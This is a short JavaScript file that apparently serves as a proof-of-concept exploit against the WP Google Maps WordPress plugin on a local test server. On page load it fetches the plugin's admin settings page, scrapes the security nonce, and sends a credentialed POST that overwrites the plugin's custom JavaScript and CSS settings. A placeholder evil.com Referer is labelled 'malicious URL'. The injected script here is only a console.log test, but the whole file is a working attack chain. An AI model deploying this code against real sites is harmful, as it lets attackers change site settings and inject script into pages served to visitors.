document.addEventListener('DOMContentLoaded', () => {
  fetch('http://localhost:8012/wordpress/wp-admin/admin.php?page=wp-google-maps-menu-settings')
    .then(response => {
      if (!response.ok) {
        throw new Error('Network response was not ok');
      }
      return response.text();
    })
    .then(html => {
      // Extract the nonce value from the HTML response
      const parser = new DOMParser();
      const doc = parser.parseFromString(html, 'text/html');

      // Wait for the page to load before querying
      const nonceInput = doc.querySelector('input[name="nonce"]');

      if (!nonceInput) {
        console.error('Nonce input not found');
        return; // Exit if nonce is not found
      }

      const nonceValue = nonceInput.value; // Ensure the correct field name is used

      // Prepare the POST request with the required parameters
      return fetch('http://localhost:8012/wordpress/wp-admin/admin-post.php', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'X-Requested-With': 'XMLHttpRequest',
          'Referer': 'http://evil.com' // Add your malicious URL here
        },
        credentials: 'include', // Include credentials for authentication
        body: `action=wpgmza_save_settings&_nonce=${nonceValue}&wpgmza_custom_js=console.log('TestJS');&wpgmza_custom_css=.test-class{color:red;}&wpgmza_settings_marker_pull=some_value`
      });
    })
    .then(response => response.json())
    .then(data => console.log('Response from API:', data))
    .catch(error => console.error('Error:', error));
});
